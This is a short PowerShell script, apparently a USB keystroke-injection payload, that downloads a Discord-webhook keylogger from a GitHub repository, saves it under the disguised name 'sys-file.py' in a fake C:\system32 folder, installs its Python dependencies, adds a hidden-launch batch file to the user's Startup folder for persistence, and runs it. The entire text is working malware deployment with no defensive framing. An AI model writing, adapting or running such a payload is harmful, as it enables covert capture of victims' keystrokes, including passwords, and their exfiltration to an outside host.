New-Item -ItemType Directory -Path 'C:\system32\' -Force

cd C:\system32\

iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/discord-keylogger/logger.py -OutFile C:\system32\sys-file.py

python -m pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org discordwebhook pynput --user

New-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat" -Force
'@echo off', 'start /B pythonw.exe "C:\system32\sys-file.py"' | Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat"

Python sys-file.py $dc
